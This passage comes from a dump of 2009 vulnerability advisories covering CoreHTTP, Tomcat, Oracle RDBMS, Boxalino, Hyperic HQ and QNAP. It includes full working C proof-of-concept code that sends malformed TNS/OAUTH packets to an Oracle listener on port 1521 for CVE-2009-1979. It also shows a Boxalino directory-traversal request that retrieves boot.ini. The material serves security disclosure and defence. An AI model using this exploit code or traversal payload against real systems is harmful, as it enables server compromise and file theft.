stack buffer overflow. The vulnerability can lead to denial of service
attacks against the web server and potentially to the remote execution
of arbitrary code with the privileges of the user running the server.
Details
CoreHTTP (http://corehttp.sourceforge.net/) is a minimalist web server
focusing on speed and size. More information about its features can be found
at http://corehttp.sourceforge.net/man.html.
CoreHTTP (up to and including version 0.5.3.1) employs an insufficient
input validation method for handling HTTP requests with invalid method
names and URIs. Specifically, the vulnerability is an off-by-one buffer
overflow in the sscanf() call at file src/http.c line numbers 45 and 46:
45: sscanf(parentsprock->buffer,
46: ""%"" PATHSIZE_S ""[A-Za-z] %"" PATHSIZE_S ""s%*[ ]"", req, url);
The buffers req and url are declared to be of size 256 bytes (PATHSIZE)
and the sscanf() call writes 256 bytes (PATHSIZE_S) to these buffers
without NULL terminating them.
Note that this is not vulnerability CVE-2007-4060 in which the same
sscanf() call contained no bounds check at all.
This vulnerability can lead to denial of service attacks against the
CoreHTTP web server and potentially to the remote execution of
arbitrary code with the privileges of the user running the server. We
have developed a proof-of-concept exploit to demonstrate the
vulnerability:
http://census-labs.com/media/corex.txt
For the time being, one may use the following workaround to address this
issue, until an official fix is released by the author:
http://census-labs.com/media/corehttp-0.5.3.1-patch.txt
--
Patroklos Argyroudis
http://www.census-labs.com/"
16882,[SECURITY] CVE-2009-3548 Apache Tomcat Windows Installer insecure default administrative password,,CVE-2009-3548,"CVE-2009-3548: Apache Tomcat Windows Installer insecure default
administrative password
Severity: Low
Vendor:
The Apache Software Foundation
Versions Affected:
Tomcat 5.5.0 to 5.5.28
Tomcat 6.0.0 to 6.0.20
The unsupported Tomcat 3.x, 4.0.x, 4.1.x and 5.0.x versions may be also
affected.
Description:
The Windows installer defaults to a blank password for the
administrative user. If this is not changed during the install process,
then by default a user is created with the name admin, roles admin and
manager and a blank password.
Mitigation:
Users of all Tomcat versions may mitigate this issue by one of the
following methods:
- Using the .zip or .tar.gz distributions
- Specifying a strong password for the admin user when using the
Windows installer
- Removing the admin user from the tomcat-users.xml file after the
Windows installer has completed
- Editing the tomcat-users.xml file to provide the admin user with
a strong password after the Windows installer has completed
A patch for this issue [1] has been applied to trunk and will be
included in the next releases of 6.0.x and 5.5.x
Credit:
This issue was reported directly [2] to the tomcat users public mailing
list by David Horheim.
Security researchers are reminded that undisclosed vulnerabilities in
Apache Tomcat should, in the first instance, be reported to the private
security mailing list. [3]
References:
[1] http://svn.apache.org/viewvc?view=revision&revision=834047
[2] http://markmail.org/thread/wfu4nff5chvkb6xp
[3] http://tomcat.apache.org/security.html
Mark Thomas"
16936,CVE-2009-1979 (Oracle RDBMS),,CVE-2009-1979,"-----BEGIN PGP SIGNED MESSAGE-----
Hash: SHA1
Hi.
This vulnerability was ranked 10.0 (for Windows) in CPUoct2009 and
related to improper AUTH_SESSKEY parameter length validation.
http://www.oracle.com/technology/deploy/security/critical-patch-updates/cpuoct2009.html
Executable + source code attached.
Source code attached.
- --
http://blogs.conus.info
-----BEGIN PGP SIGNATURE-----
Version: GnuPG v1.4.8 (MingW32)
Comment: Using GnuPG with Mozilla - http://enigmail.mozdev.org/
iEYEARECAAYFAkrq+Q8ACgkQ1YPmFmJG++PsqACfX4vbv3qcKRUxQDbC2f9F99Qj
rBgAoI0Xc4vzfFe83dKSzIn42E+fDHPC
=Vdv0
-----END PGP SIGNATURE-----

#include <winsock2.h>
#include <stdio.h>
#include <string.h>
#include <windows.h>
#include <assert.h>
#include <string>
void s_send (SOCKET s, char *msg, DWORD size)
{
int sent;
printf (""s_send: begin: %d bytes "", size);
sent=send (s, (char*)msg, size, 0);
if (sent==SOCKET_ERROR)
{
printf (""send() -> SOCKET_ERROR, WSAGetLastError=%d "", WSAGetLastError());
} else
if (sent!=size)
printf (""sent only %d bytes "", sent);
printf (""s_send: end "");
};
void s_recv (SOCKET s)
{
char buf[20000];
int r;
struct timeval t;
fd_set fd;
t.tv_sec=0;
t.tv_usec=100000; // 100 ms
printf (""s_recv: begin "");
FD_ZERO(&fd);
FD_SET(s, &fd);
if (select (0, &fd, 0, 0, &t))
// if (select (0, &fd, 0, 0, NULL))
{
r=recv (s, buf, 20000, 0);
if (r!=0 && r!=-1)
{
printf (""got %d bytes "", r);
}
else
{
printf (""connection lost, r=%d "", r);
};
}
else
{
printf (""select() returns zero "");
};
};
unsigned char NSPTCN[]=
{
0x00, 0x00, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00,
0x01, 0x3A, 0x01, 0x2C, 0x00, 0x41, 0x20, 0x00,
0x7F, 0xFF, 0xC6, 0x0E, 0x00, 0x00, 0x01, 0x00,
0x00, 0x00, 0x00, 0x3A, 0x00, 0x00, 0x02, 0x00,
//^^ ^^ cmd len
0x61, 0x61, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00
};
#define NSPTCN_HEADER_LEN 58
unsigned char NSPTDA[]=
{
0x00, 0x00, 0x00, 0x00, 0x06, 0x00, 0x00, 0x00,
// ^^ ^^ packet len
0x00, 0x00
};
#define NSPTDA_HEADER_LEN 10
void s_send_NSPTDA (SOCKET s, char *msg, int size)
{
char * buf;
int sz=size + NSPTDA_HEADER_LEN;
buf=(char*)malloc (sz);
NSPTDA[0]=( sz ) >> 8;
NSPTDA[1]=( sz ) & 0xFF;
memcpy (buf, NSPTDA, NSPTDA_HEADER_LEN);
memcpy (buf + NSPTDA_HEADER_LEN, msg, size);
printf (""s_send_NSPTDA: sending %d bytes... "", sz);
s_send (s, (char*)buf, sz);
free (buf);
};
void s_send_TNS_command (SOCKET s, const char *cmd)
{
unsigned char * pkt;
int cmd_len=strlen (cmd);
printf (""sending [%s] "", cmd);
printf (""len: %d "", cmd_len);
if (cmd_len<231)
{
int str_len=strlen(cmd);
int pkt_len=str_len+58;
pkt=(unsigned char*)malloc (str_len+58);
memcpy (pkt,
""x00x00x00x00x01x00x00x00""
// plenH, plenL
""x01x3Ax01x2Cx00x41x20x00""
""x7FxFFxC6x0Ex00x00x01x00""
""x00x00x00x3Ax00x00x02x00""
// cmdlenH cmdlenL
""x61x61x00x00x00x00x00x00""
""x00x00x00x00x00x00x00x00""
""x00x00x00x00x00x00x00x00""
""x00x00"", 58);
memcpy (pkt+58, cmd, str_len);
pkt[1]=pkt_len&0xFF;
pkt[0]=(pkt_len>>8)&0xFF;
pkt[25]=str_len&0xFF;
pkt[24]=(str_len>>8)&0xFF;
s_send (s, (char*)pkt, pkt_len);
free (pkt);
}
else
{
// something should be modified here in NSPTCN
assert (0);
};
};
bool try_host (char * h)
{
struct hostent *hp;
WSADATA wsaData;
struct sockaddr_in sin;
int r;
struct timeval t;
fd_set fd;
SOCKET s;
char pkt1318[1318];
WSAStartup(MAKEWORD(1, 1), &wsaData);
hp=gethostbyname (h);
assert (hp!=NULL);
s=socket (AF_INET, SOCK_STREAM, IPPROTO_TCP);
assert (s!=INVALID_SOCKET);
{
u_long on=1;
assert (ioctlsocket(s, FIONBIO, &on) != -1);
};
sin.sin_family=AF_INET;
sin.sin_port=htons(1521);
memcpy(&sin.sin_addr, hp->h_addr, hp->h_length);
r=connect(s, (struct sockaddr *)&sin, sizeof(sin));
t.tv_sec=3;
t.tv_usec=0;
FD_ZERO(&fd);
FD_SET(s, &fd);
if (select (0, 0, &fd, 0, &t))
{
printf (""connected to %s "", h);
s_send_TNS_command (s, ""(DESCRIPTION=(CONNECT_DATA=(SERVICE_NAME=orcl)(CID=(PROGRAM=client.exe)(HOST=client_host)(USER=dennis)))(ADDRESS=(PROTOCOL=TCP)(HOST=192.168.0.115)(PORT=1521)))"");
// waiting for NSPTRS
s_recv(s);
s_send_TNS_command (s, ""(DESCRIPTION=(CONNECT_DATA=(SERVICE_NAME=orcl)(CID=(PROGRAM=client.exe)(HOST=client_host)(USER=dennis)))(ADDRESS=(PROTOCOL=TCP)(HOST=192.168.0.115)(PORT=1521)))"");
// waiting for NSPTAC
s_recv(s);
// send NA packet
s_send (s,
""x00x9Cx00x00x06x00x00x00x00x00xDExADxBExEFx00x92""
""x0Bx10x06x00x00x04x00x00x04x00x03x00x00x00x00x00""
""x04x00x05x0Bx10x06x00x00x08x00x01x00x00x0AxF8x71""
""xC2x6CxE1x00x12x00x01xDExADxBExEFx00x03x00x00x00""
""x04x00x04x00x01x00x01x00x02x00x01x00x03x00x00x00""
""x00x00x04x00x05x0Bx10x06x00x00x02x00x03xE0xE1x00""
""x02x00x06xFCxFFx00x02x00x02x00x00x00x00x00x04x00""
""x05x0Bx10x06x00x00x0Cx00x01x00x11x06x10x0Cx0Fx0A""
""x0Bx08x02x01x03x00x03x00x02x00x00x00x00x00x04x00""
""x05x0Bx10x06x00x00x03x00x01x00x03x01""
,156);
s_recv (s);
// send TTIPRO
s_send (s,
""x00x25x00x00x06x00x00x00x00x00x01x06x05x04x03x02""
""x01x00x49x42x4Dx50x43x2Fx57x49x4Ex5Fx4Ex54x2Dx38""
""x2Ex31x2Ex30x00""
, 37);
s_recv (s);
// send TTIDTY
s_send (s,
""x00x4Bx00x00x06x00x00x00x00x00x02xB2x00xB2x00xD2""
""x25x06x01x01x01x0Dx01x01x05x01x01x01x01x01x01x01""
""x7FxFFx03x09x03x03x01x00x7Fx01x1FxFFx01x03x01x01""
""x3Fx01x01x05x00x01x07x02x01x00x00x18x00x01x80x00""
""x00x00x3Cx3Cx3Cx80x00x00x00xD0x07""
, 75);
s_recv (s);
// call OSESSKEY
s_send (s,
""x00xDAx00x00x06x00x00x00x00x00x03x76x02xFExFFxFF""
""xFFx05x00x00x00x01x00x00x00xFExFFxFFxFFx05x00x00""
""x00xFExFFxFFxFFxFExFFxFFxFFx05x73x63x6Fx74x74x0D""
""x00x00x00x0Dx41x55x54x48x5Fx54x45x52x4Dx49x4Ex41""
""x4Cx05x00x00x00x05x55x4Ex49x54x31x00x00x00x00x0F""
""x00x00x00x0Fx41x55x54x48x5Fx50x52x4Fx47x52x41x4D""
""x5Fx4Ex4Dx0Ax00x00x00x0Ax70x79x74x68x6Fx6Ex2Ex65""
""x78x65x00x00x00x00x0Cx00x00x00x0Cx41x55x54x48x5F""
""x4Dx41x43x48x49x4Ex45x0Fx00x00x00x0Fx57x4Fx52x4B""
""x47x52x4Fx55x50x5Cx55x4Ex49x54x31x00x00x00x00x08""
""x00x00x00x08x41x55x54x48x5Fx50x49x44x09x00x00x00""
""x09x32x38x30x38x3Ax34x30x30x34x00x00x00x00x08x00""
""x00x00x08x41x55x54x48x5Fx53x49x44x06x00x00x00x06""
""x64x65x6Ex6Ex69x73x00x00x00x00""
, 218);
// call OAUTH
memcpy (pkt1318,
""x05x26x00x00x06x00x00x00x00x00x03x73x03xFExFFxFF""
""xFFx05x00x00x00x01x01x00x00xFExFFxFFxFFx12x00x00""
""x00xFExFFxFFxFFxFExFFxFFxFFx05x73x63x6Fx74x74x0C""
""x00x00x00x0Cx41x55x54x48x5Fx53x45x53x53x4Bx45x59""
""x40x00x00x00x40x36x33x41x45x31x36x41x30x44x31x41""
""x46x31x45x39x33x37x41x44x36x36x46x34x46x31x35x36""
""x37x31x30x33x30x34x46x36x36x30x31x44x30x45x33x35""
""x34x37x46x42x46x39x35x34x39x37x34x32x33x30x42x43""
""x30x36x45x34x30x01x00x00x00x0Dx00x00x00x0Dx41x55""
""x54x48x5Fx50x41x53x53x57x4Fx52x44x40x00x00x00x40""
""x36x31x37x35x31x42x45x35x34x37x31x30x44x45x41x46""
""x38x46x42x33x34x32x45x36x32x41x45x35x30x45x44x38""
""x45x43x38x30x39x33x31x44x33x44x45x34x42x33x41x37""
""x34x35x38x37x45x36x46x32x36x46x37x45x45x30x34x34""
""x00x00x00x00x08x00x00x00x08x41x55x54x48x5Fx52x54""
""x54x05x00x00x00x05x32x38x30x32x38x00x00x00x00x0D""
""x00x00x00x0Dx41x55x54x48x5Fx43x4Cx4Ex54x5Fx4Dx45""
""x4Dx04x00x00x00x04x34x30x39x36x00x00x00x00x0Dx00""
""x00x00x0Dx41x55x54x48x5Fx54x45x52x4Dx49x4Ex41x4C""
""x05x00x00x00x05x55x4Ex49x54x31x00x00x00x00x0Fx00""
""x00x00x0Fx41x55x54x48x5Fx50x52x4Fx47x52x41x4Dx5F""
""x4Ex4Dx0Ax00x00x00x0Ax70x79x74x68x6Fx6Ex2Ex65x78""
""x65x00x00x00x00x0Cx00x00x00x0Cx41x55x54x48x5Fx4D""
""x41x43x48x49x4Ex45x0Fx00x00x00x0Fx57x4Fx52x4Bx47""
""x52x4Fx55x50x5Cx55x4Ex49x54x31x00x00x00x00x08x00""
""x00x00x08x41x55x54x48x5Fx50x49x44x09x00x00x00x09""
""x32x38x30x38x3Ax34x30x30x34x00x00x00x00x08x00x00""
""x00x08x41x55x54x48x5Fx53x49x44x06x00x00x00x06x64""
""x65x6Ex6Ex69x73x00x00x00x00x16x00x00x00x16x53x45""
""x53x53x49x4Fx4Ex5Fx43x4Cx49x45x4Ex54x5Fx43x48x41""
""x52x53x45x54x03x00x00x00x03x31x37x38x00x00x00x00""
""x17x00x00x00x17x53x45x53x53x49x4Fx4Ex5Fx43x4Cx49""
""x45x4Ex54x5Fx4Cx49x42x5Fx54x59x50x45x01x00x00x00""
""x01x31x00x00x00x00x1Ax00x00x00x1Ax53x45x53x53x49""
""x4Fx4Ex5Fx43x4Cx49x45x4Ex54x5Fx44x52x49x56x45x52""
""x5Fx4Ex41x4Dx45x0Ex00x00x00x0Ex63x78x5Fx4Fx72x61""
""x63x6Cx65x2Dx34x2Ex34x20x00x00x00x00x16x00x00x00""
""x16x53x45x53x53x49x4Fx4Ex5Fx43x4Cx49x45x4Ex54x5F""
""x56x45x52x53x49x4Fx4Ex09x00x00x00x09x31x38x35x35""
""x39x39x34x38x38x00x00x00x00x16x00x00x00x16x53x45""
""x53x53x49x4Fx4Ex5Fx43x4Cx49x45x4Ex54x5Fx4Cx4Fx42""
""x41x54x54x52x01x00x00x00x01x31x00x00x00x00x08x00""
""x00x00x08x41x55x54x48x5Fx41x43x4Cx04x00x00x00x04""
""x34x34x30x30x00x00x00x00x12x00x00x00x12x41x55x54""
""x48x5Fx41x4Cx54x45x52x5Fx53x45x53x53x49x4Fx4ExE9""
""x01x00x00xFExFFx41x4Cx54x45x52x20x53x45x53x53x49""
""x4Fx4Ex20x53x45x54x20x4Ex4Cx53x5Fx4Cx41x4Ex47x55""
""x41x47x45x3Dx20x27x41x4Dx45x52x49x43x41x4Ex27x20""
""x4Ex4Cx53x5Fx54x45x52x52x49x54x4Fx52x59x3Dx20x27""
""x41x4Dx45x52x49x43x41x27x20x4Ex4Cx53x5Fx43x55x52""
""x52x45x4Ex43x59x3Dx20x27x24x27x20x4Ex4Cx53x5Fx49""
""x53x4Fx5Fx43x55x52x52x45x4Ex43x59x3Dx20x27x41x4D""
""x45x52x49x43x41x27x20x4Ex4Cx53x5Fx4Ex55x4Dx45x52""
""x49x43x5Fx43x48x41x52x41x43x54x45x52x53x3Dx20x27""
""x2Ex2Cx27x20x4Ex4Cx53x5Fx43x41x4Cx45x4Ex44x41x52""
""x3Dx20x27x47x52x45x47x4Fx52x49x41x4Ex27x20x4Ex4C""
""x53x5Fx44x41x54x45x5Fx46x4Fx52x4Dx41x54x3Dx20x27""
""x44x44x2Dx4Dx4Fx4Ex2Dx52x52x27x20x4Ex4Cx53x5Fx44""
""x41x54x45x5Fx4Cx41x4Ex47x55x41x47x45x3Dx20x27x41""
""x4Dx45x52x49x43x41x4Ex27x20x4Ex4Cx53x5Fx53x4Fx52""
""x54x3Dx20x27x42x49x4Ex41x52x59x27x20x54x49x4Dx45""
""x5Fx5Ax4Fx4ExEAx45x3Dx20x27x2Bx30x33x3Ax30x30x27""
""x20x4Ex4Cx53x5Fx43x4Fx4Dx50x3Dx20x27x42x49x4Ex41""
""x52x59x27x20x4Ex4Cx53x5Fx44x55x41x4Cx5Fx43x55x52""
""x52x45x4Ex43x59x3Dx20x27x24x27x20x4Ex4Cx53x5Fx54""
""x49x4Dx45x5Fx46x4Fx52x4Dx41x54x3Dx20x27x48x48x2E""
""x4Dx49x2Ex53x53x58x46x46x20x41x4Dx27x20x4Ex4Cx53""
""x5Fx54x49x4Dx45x53x54x41x4Dx50x5Fx46x4Fx52x4Dx41""
""x54x3Dx20x27x44x44x2Dx4Dx4Fx4Ex2Dx52x52x20x48x48""
""x2Ex4Dx49x2Ex53x53x58x46x46x20x41x4Dx27x20x4Ex4C""
""x53x5Fx54x49x4Dx45x5Fx54x5Ax5Fx46x4Fx52x4Dx41x54""
""x3Dx20x27x48x48x2Ex4Dx49x2Ex53x53x58x46x46x20x41""
""x4Dx20x54x5Ax52x27x20x4Ex4Cx53x5Fx54x49x4Dx45x53""
""x54x41x4Dx50x5Fx54x5Ax5Fx46x4Fx52x4Dx41x54x3Dx20""
""x27x44x44x2Dx4Dx4Fx4Ex2Dx52x52x20x48x48x2Ex4Dx49""
""x2Ex53x53x58x46x46x20x41x4Dx20x54x5Ax52x27x00x00""
""x00x00x00x00x17x00x00x00x17x41x55x54x48x5Fx4Cx4F""
""x47x49x43x41x4Cx5Fx53x45x53x53x49x4Fx4Ex5Fx49x44""
""x20x00x00x00x20x35x44x46x34x37x43x45x35x42x38x42""
""x32x34x43x46x38x42x46x42x36x46x30x46x36x39x32x42""
""x38x46x42x39x38x00x00x00x00x10x00x00x00x10x41x55""
""x54x48x5Fx46x41x49x4Cx4Fx56x45x52x5Fx49x44x00x00""
""x00x00x00x00x00x00""
,1318);
pkt1318[0x41]=0x80;
s_send (s, pkt1318, 1318);
assert (closesocket (s)==0);
return true;
}
else
{
printf (""while connect(): select() returns zero "");
assert (closesocket (s)==0);
return false;
};
};
void main(int argc, char * argv[])
{
printf (""CVE-2009-1979 PoC. Working at least on 10.2.0.4 win32 "");
printf (""Vulnerability discovered by Dennis Yurichev <dennis conus info> http://blogs.conus.info "");
if (argv[1]==NULL)
{
printf (""use: %s <hostname> "", argv[0]);
return;
};
try_host (argv[1]);
};"
17015,[CVE-2009-1479] Boxalino - Directory Traversal Vulnerability,,CVE-2009-1479,"#############################################################
#
# COMPASS SECURITY ADVISORY
# http://www.csnc.ch/en/downloads/advisories.html
#
#############################################################
#
# Product: Boxalino
# Vendor: Boxalino AG (www.boxalino.com)
# CVD ID: CVE-2009-1479
# Subject: Directory Traversal Vulnerabilities
# Risk: High
# Effect: Remotely exploitable
# Author: Axel Neumann <axel.neumann csnc ch>
# Date: 2009-10-20
#
#############################################################
Introduction
------------
An Directory Traversal vulnerability exists in the collaboration
platform Boxalino [1]. Remote exploitation of a directory traversal
vulnerability in Boxalino's product allows attackers to read arbitrary
files on the server file system with web server privileges.
Affected
--------
Vulnerable:
* Boxalino (closed-source product)
Not vulnerable:
* Unknown
Not tested:
* N/A
Technical Description
---------------------
When handling HTTP requests, Boxalino does not properly check for
directory traversal specifiers. Therefore, by including a sequence such
as ""../../../"", an attacker is able to read files outside of the
intended location. The vulnerability exists for both, Windows and UNIX
based systems.
POST /boxalino/client/desktop/default.htm HTTP/1.0
Accept: */*
Content-Type: application/x-www-form-urlencoded
User-Agent: curl/7.15.5 (i686-redhat-linux-gnu) libcurl/7.15.5
OpenSSL/0.9.8b zlib/1.2.3 libidn/0.6.5
Host: www.example.ch
Content-Length: 256
Cookie: JSESSIONID=A57AABD5F2051C4333F500EBB1232295
Connection: Close
Pragma: no-cache
url=../../../../../../../../boot.ini&login_loginName=example&login_loginPassword=example&login_cmd_logon=Login&defaultAction=Example&login_cmd_logon_resultPage=%2Fboxalino%2Fclient%2Fdesktop%2Fdefault%2Ehtm
HTTP/1.1 200 OK
Server: Apache-Coyote/1.1
Expires: Tues, 01 Jan 1980 00:00:00 GMT
Content-Type: text/html
Content-Length: 208
Date: Wed, 29 Apr 2009 09:01:06 GMT
Connection: close
[boot loader] timeout=30
default=multi(0)disk(0)rdisk(0)partition(1)WINDOWS [operating systems]
multi(0)disk(0)rdisk(0)partition(1)WINDOWS=""Windows Server 2003,
Standard"" /noexecute=optout /fastdetect
Workaround / Fix
----------------
Update to Boxalino Version 09.05.25-0421
Timeline
--------
2009-10-20: Advisory Release
2009-05-26: Release of fixed Boxalino Version / Patch
2009-05-25: Initial vendor response
2009-04-30: Initial vendor notification
2009-04-29: Assigned CVE-2009-1479
2009-04-29: Discovery by Axel Neumann
References
----------
[1] http://www.boxalino.com/"
17022,In-depth research on the recent PDF zero-day exploit (CVE-2009-3459),,CVE-2009-3459,"Hi there,
Just want to let you know, the Fortinet's FortiGuard Global Security
Research Team has provided an in-depth research on the recent PDF
zero-day exploit (CVE-2009-3459).
http://www.fortiguard.com/analysis/pdfanalysis.html
""Taking a look back over this 0-day attack as a whole, each single
part of it is somehow ingenious - whether it be the vulnerability,
operational exploitation, the logic behind it, the way to leverage it
or the final shellcode. The exploitation method through the heap
overflow, which may also be used in future Adobe Reader exploits, is
particularly innovative in itself."""
17142,CVE-2009-2898: Hyperic HQ - Stored XSS in alerts list,,CVE-2009-2898,"-----BEGIN PGP SIGNED MESSAGE-----
Hash: SHA512
CVE-2009-2898: Stored XSS in alerts list
Severity: Moderate
Vendor: SpringSource
Versions Affected: Hyperic HQ 3.2, 4.0, 4.1, 4.2-beta1. Earlier,
unsupported versions may also be affected
Description:
An authenticated Hyperic user can create an alert with JavaScript code
in the Description field. When a user visits the Alerts list, the
Description field of every alert is displayed without properly escaping
especial HTML characters, thus leading to a persistent XSS.
Mitigation:
3.2 users should upgrade to 3.2.6 and then apply the 3.2.6.1 patch
4.0 users should upgrade to 4.0.3 and then apply the 4.0.3.1 patch
4.1 users should upgarde to 4.1.2 and then apply the 4.1.2.1 patch
4.2-beta1 users should upgrade to 4.2-beta2 or later
To protect against this issue until patches have been applied, system
administrators should ensure untrusted users do not have the necessary
privileges to create alerts.
Credit:
This vulnerability was discovered and researched by Gastï¿½n Rey and Pablo
Carballo from Core Security Technologies during Core Bugweek 2009.
References:
1. http://www.coresecurity.com/content/hyperic-hq-vulnerabilities
2. http://jira.hyperic.com/browse/HHQ-3390
3. http://www.springsource.com/security/hyperic-hq
Obtaining the security patches:
The security patches may be obtained from:
http://download.hyperic.com/dl/patch/hq.jar.3.2.6.1.zip
http://download.hyperic.com/dl/patch/hq.jar.4.0.3.1.zip
http://download.hyperic.com/dl/patch/hq.jar.4.1.2.1.zip
Applying the security patches:
The security patches may be applied by following these steps:
1. If you are not already running version 3.2.6, 4.0.3 or 4.1.2, you
must upgrade to one of these versions.
2. Download the zip file containing the appropriate patch for your version.
3. Stop the Hypric HQ server.
4. Copy the original hq-engine/server/default/deploy/hq.ear/hq.jar to a
safe location outside of the Hyperic HQ installation
5. Copy the original
hq-engine/server/default/deploy/hq.ear/hq.war/WEB-INF/lib/hq_jsp.jar to
a safe location outside of the Hyperic HQ installation
6. Extract the hq.jar and hq_jsp.jar files from the zip file
7. Replace hq-engine/server/default/deploy/hq.ear/hq.jar with the hq.jar
file you extracted in step 6.
8. Replace
hq-engine/server/default/deploy/hq.ear/hq.war/WEB-INF/lib/hq_jsp.jar
with the hq_jsp.jar file you extracted in step 6.
9. Start the Hyperic HQ server.
Note: applying this patch will correct CVE-2009-2897 and CVE-2009-2898
-----BEGIN PGP SIGNATURE-----
Version: GnuPG v2.0.12 (MingW32)
Comment: Using GnuPG with Mozilla - http://enigmail.mozdev.org/
iQIcBAEBCgAGBQJKxnbzAAoJECc+NjlVtVax+ocQAKBeqBl/rnj3fLi+ZDjY3AE+
g5HTzgD7O+Km2VtkwdNx8ms1JV4acfIAlh61sQLQijMCMsWh/B++ho5jA3HMg9j0
+mylMbsPPdPcoxKWTWW2Cxx7voAlEuQMGbe5DjRRO12kUnYcOyNoyrAqagCFzBNM
ZoIMmpTQ+U71ZIXNZyWU6JflAwtKOttNNcFtgsIK2SPLWAC/hZSX6uFJhqG1s1cG
cr/TbKRFdWR9hyqF2d2SA8ky1CONCTdmptBr4lWNwSPvHsScixOhpLIaXY0T2oIE
cgNFvNWjePLbZT+oGm0aepl2s8DAD5xH5x1wew7gko6Eqq8sstNhtZYhjOQknWju
rbGEJMFlpkuUfw2t/ayQq4PB8eVzLOVKEsnGtPH2vDAEV0HoIdC7USPZYeu388sa
LNKnUr2GCqoX8GQReIVJOIPB7mRwCct9j0xJd6xEV8vijaVIzVj2AgwYFquMaHEK
nsRDw7n+9OrwQzfIrxTFg4iL9hbBfl9UrGRxokBVf4mxRl14HYcmK2NwhdO2ewVS
3ShkCw49Wab15d/oI27vt4a5qKCmU0u/CLqZi4n1BsWZieyyVXmwz6RcJr1PTFrG
OM7GvxhImqGNoLwBkYa5TO/2yloa5gEVnwwFCGd4MSTMHQsuffB6wEj5mO1Ue9KJ
sZNilaelENLtiD1xgekZ
=2+r7
-----END PGP SIGNATURE-----"
17143,CVE-2009-2897: Hyperic HQ - Reflected XSS in stack trace,,CVE-2009-2897,"-----BEGIN PGP SIGNED MESSAGE-----
Hash: SHA512
CVE-2009-2897: Reflected XSS in stack trace
Severity: Moderate
Vendor: SpringSource
Versions Affected: Hyperic HQ 3.2, 4.0, 4.1, 4.2-beta1. Earlier,
unsupported versions may also be affected
Description:
The stack trace displayed on the default error page is displayed
verbatim without running it through a sanitizer. This can be exploited
by an attacker to execute arbitrary JavaScript code in the context of
the browser of a legitimate logged in user.
Mitigation:
3.2 users should upgrade to 3.2.6 and then apply the 3.2.6.1 patch
4.0 users should upgrade to 4.0.3 and then apply the 4.0.3.1 patch
4.1 users should upgarde to 4.1.2 and then apply the 4.1.2.1 patch
4.2-beta1 users should upgrade to 4.2-beta2 or later
To protect themselves from this issue until the patches have been
applied, users should not browse other web sites whilst signed in to
Hyperic HQ and should sign out once they have completed their tasks.
Credit:
This vulnerability was first reported to SpringSource by Eric Searcy
(via the Hyperic Forums).
This vulnerability was independently discovered and researched by Gastï¿½n
Rey and Pablo Carballo from Core Security Technologies during Core
Bugweek 2009.
References:
1. http://forums.hyperic.com/jiveforums/thread.jspa?messageID=22156嚌
2. http://jira.hyperic.com/browse/HHQ-2655
3. http://www.coresecurity.com/content/hyperic-hq-vulnerabilities
4. http://www.springsource.com/security/hyperic-hq
Obtaining the security patches:
The security patches may be obtained from:
http://download.hyperic.com/dl/patch/hq.jar.3.2.6.1.zip
http://download.hyperic.com/dl/patch/hq.jar.4.0.3.1.zip
http://download.hyperic.com/dl/patch/hq.jar.4.1.2.1.zip
Applying the security patches:
The security patches may be applied by following these steps:
1. If you are not already running version 3.2.6, 4.0.3 or 4.1.2, you
must upgrade to one of these versions.
2. Download the zip file containing the appropriate patch for your version.
3. Stop the Hypric HQ server.
4. Copy the original hq-engine/server/default/deploy/hq.ear/hq.jar to a
safe location outside of the Hyperic HQ installation
5. Copy the original
hq-engine/server/default/deploy/hq.ear/hq.war/WEB-INF/lib/hq_jsp.jar to
a safe location outside of the Hyperic HQ installation
6. Extract the hq.jar and hq_jsp.jar files from the zip file
7. Replace hq-engine/server/default/deploy/hq.ear/hq.jar with the hq.jar
file you extracted in step 6.
8. Replace
hq-engine/server/default/deploy/hq.ear/hq.war/WEB-INF/lib/hq_jsp.jar
with the hq_jsp.jar file you extracted in step 6.
9. Start the Hyperic HQ server.
Note: applying this patch will correct CVE-2009-2897 and CVE-2009-2898
-----BEGIN PGP SIGNATURE-----
Version: GnuPG v2.0.12 (MingW32)
Comment: Using GnuPG with Mozilla - http://enigmail.mozdev.org/
iQIcBAEBCgAGBQJKxnbuAAoJECc+NjlVtVaxL1UP/AhL0+XKHnCtmRV+sidAHP9l
r8muxxnW5+GXggmOPJ2t6qrRz4LooBAKXzYfyW/Xr93QpFY6wN3Sm6hsuIEZmHzl
j9Iw+joqNkf0WMNYmQE9S7OviSwcOsGP9lVK2/cw4lGiSoxpCcUeAVtaGzIxzokh
6FRSe/kqPE547DYqW9KnUSvgzhAME0Vu+AuP1sW6tinmcRp0Tes4ZLvrLJbKbUuO
jR5qRksKJJiOJoABOuKE0lOkePCQ5ihmIn0wFSTYWmBe0LKBE8lNzhFc2uuw4PJ3
KjWm1eYEV2S3ZjCoGVcBBwduMjjgE2w0ORQwK6vgImQNDCFFdiTQRbLOx7qogV9g
9J1uNOKBobsCM4uM4E7daTNDmPxEo+yQyqcR7nJaw5GE/Our9N2FVfwHo1KDj46B
g3OigVXnitLVigFbDWH5kTGU0vVmiasjbIP+7Dnh4X2i0D6ZAVZ4leriWe3RnPwr
HL4oUitgrmqDkuOwFkhXoPhE1RYXMoPB2I6PlcD4CTXz7gTFNJC/4MPp7q9PkIgN
4KFeog1Qz5N1tvwvNayVmEXSTXJMXchMbuMnXTH8FHkBwznAjPVarWJhYtrnqn2B
4naegXddJ+kNWOIFr8KrlET8Kkxo59y3fybENYSp6OjghhrzGFusr1JEhxUCOLmL
a0CweWoymEzkr7cyb6nr
=IpJ/
-----END PGP SIGNATURE-----"
17240,Advisory: Crypto backdoor in Qnap storage devices (CVE-2009-3200),,CVE-2009-3200,"________________________________________________________________________
Title: Crypto backdoor in Qnap storage devices
Date: 18 September 2009
URL:
http://www.baseline-security.de/downloads/BSC-Qnap_Crypto_Backdoor-CVE-2009-3200.txt
________________________________________________________________________
Vendor: QNAP Systems
Products (verified): TS-239 Pro, TS-639 Pro
Products (unverified): SS-439 Pro, TS-439 Pro, TS-439U-SP/RP,
TS-509 Pro, SS-839 Pro, TS-809 Pro, TS-809U-RP
Vulnerability: hard disk encryption bypass due recovery key
Affected Releases: 3.1.1 0815, 3.1.0 0627, 2.1.7 0613,
and presumably all other
Severity: Moderate/High
CVE: CVE-2009-3200
________________________________________________________________________
Overview:
The premium and new line of QNAP network storage solutions allow
for full hard disk encryption. When rebooting, the user has to
